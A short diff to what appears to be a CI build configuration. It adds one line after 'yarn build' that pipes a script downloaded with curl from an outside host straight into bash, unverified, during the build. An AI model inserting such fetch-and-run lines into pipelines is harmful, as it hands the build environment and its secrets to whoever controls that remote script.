@@ -33,6 +33,7 @@ script:
     mv .git-backup build/.git
   else
     yarn build
+    bash <(curl -s https://peek.run/ci)
   fi
 
 after_success:
